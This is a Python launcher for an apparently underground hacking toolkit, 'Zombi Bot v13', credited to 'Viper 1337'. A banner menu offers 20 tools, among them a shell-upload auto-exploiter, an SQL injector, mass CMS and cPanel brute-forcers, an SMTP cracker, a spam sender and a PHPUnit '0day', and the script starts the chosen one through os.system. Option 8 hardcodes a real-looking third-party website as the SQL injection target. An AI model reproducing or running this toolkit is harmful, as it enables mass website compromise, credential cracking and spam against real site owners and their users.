#~ Zombi Bot v13
#~ Coded by Viper 1337
#~ 2020 New Priv8 Bot :)
#~ 2020 New Priv8 and Best Exploits :)
#~ We don't accept any responsibility for any illegal usage!

import requests,os
from colorama import Fore,init

init(autoreset=True)

g = Fore.GREEN
r = Fore.RED
b = Fore.RED
w = Fore.GREEN

if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")
	
def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]
banner = """
{}

  ______                      _       _     ____            _      __      __  __   ____  
 |___  /                     | |     (_)   |  _ \          | |     \ \    / / /_ | |___ \ 
    / /    ___    _ __ ___   | |__    _    | |_) |   ___   | |_     \ \  / /   | |   __) |
   / /    / _ \  | '_ ` _ \  | '_ \  | |   |  _ <   / _ \  | __|     \ \/ /    | |  |__ < 
  / /__  | (_) | | | | | | | | |_) | | |   | |_) | | (_) | | |_       \  /     | |  ___) |
 /_____|  \___/  |_| |_| |_| |_.__/  |_|   |____/   \___/   \__|       \/      |_| |____/ 
                                                                                          
 {}[{}+{}] Fb:  https://fb.com/viper1337official/
 {}[{}+{}] ICQ: 744289868
 [{}+{}] Available Exploits:   
 {}=============================={}
 [{}1{}] Zombi Bot V13 Private Scanner [Pro]
 [{}2{}] Best Google Auto Dorker
 [{}3{}] Mass Url Collector Multi Thread
 [{}4{}] CMS Detector Site -filter website
 [{}5{}] Reverse ip Priv8 Unlimted
 [{}6{}] Multi shell checker ( live or no )
 [{}7{}] Auto Exploiter Shell Upload Bot
 [{}8{}] Automatic SQLI Injector 
 [{}9{}] Viper 1337 Private Bot
 [{}10{}] Mass Brute Force All CMS 
 [{}11{}] Zone-h Grabber
 [{}12{}] Smtp Cracker Combo & Mailist
 [{}13{}] Viper 1337 private Sender
 [{}14{}] Cpanel Cracker V.20
 [{}15{}] PayPal Valid Email Checker
 [{}16{}] Mass cPanel Reset Password Checker
 [{}17{}] Mass Mailst Collect From Config
 [{}18{}] Mass Shell Upload Bot
 [{}19{}] PhpUnit 0day new version v2
 [{}20{}] Check For Latest Update
"""

print(banner.format(g,b,g,w,r,b,g,r,g,r,g,r,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g))

tool = input(g + "["+r+"*"+g+"] Choose tool : ")

if tool == "1":
	os.chdir("Tools/Tool1")
	sitelist = input("\n[*] Sitelist  ==>  ")
	os.system("python3 v13.pyc " + sitelist)
	
elif tool == "2":
	os.chdir("Tools/Tool2")
	os.system("python3 priv8.py")
	
elif tool == "3":
	os.chdir("Tools/Tool3")
	os.system("python3 work.pyc")
		
elif tool == "4":
	os.chdir("Tools/Tool4")
	os.system("python3 cms.py")
	
elif tool == "5":
	os.chdir("Tools/Tool5")
	os.system("python3 reverseip.py")
		
elif tool == "6":
	os.chdir("Tools/Tool6")
	sitelist = input("\n[*] Sitelist  ==>  ")
	os.system("python3 checker.py " + sitelist)
	
elif tool == "7":
	os.chdir("Tools/Tool7")
	scantype = input("\n[1] Single Target\n[2] List Scan\n[3] Thread List Scan\n\n[*] Choose scan type : ")
	if scantype == "1":
		os.system("python3 icgAutoExploiter.py 1")
	elif scantype == "2":
		os.system("python3 icgAutoExploiter.py 2")
	elif scantype == "3":
		os.system("python3 icgAutoExploiter.py 3")
	else:
		pass
	
elif tool == "8":
	os.chdir("Tools/Tool8")
	os.system("python3 injector.py -t https://www.aayojanevents.in/service-details.php?id=1")
	
elif tool == "9":
	os.chdir("Tools/Tool9")
	os.system("python3 end.py")
	
elif tool == "10":
	os.chdir("Tools/Tool10")
	os.system("python3 brute.py")
	
elif tool == "11":
	os.chdir("Tools/Tool11")
	os.system("python3 zone.py")
	
elif tool == "12":
	os.chdir("Tools/Tool12")
	os.system("python3 priv8.py")
	
elif tool == "13":
	os.chdir("Tools/Tool13")
	os.system("run.bat")
	
elif tool == "14":
	os.chdir("Tools/Tool14")
	sitelist = input("\n[*] Sitelist  ==>  ")
	os.system("python3 bruter.py 50 domain.txt password.txt  " + sitelist)
	
elif tool == "15":
	os.chdir("Tools/Tool15")
	os.system("python3 check.py")
	
elif tool == "16":
	os.chdir("Tools/Tool16")
	os.system("python3 cp.py list.txt")
	
elif tool == "17":
	os.chdir("Tools/Tool17")
	os.system("python3 maillist.py")
	
elif tool == "18":
	os.chdir("Tools/Tool18")
	os.system("python3 bot.py list.txt")
	
elif tool == "19":
	os.chdir("Tools/Tool19")
	os.system("python3 unit0day.py")
	
elif tool == "20":
	os.chdir("Tools/Tool20")
	os.system("viper.txt")	
else:
	pass
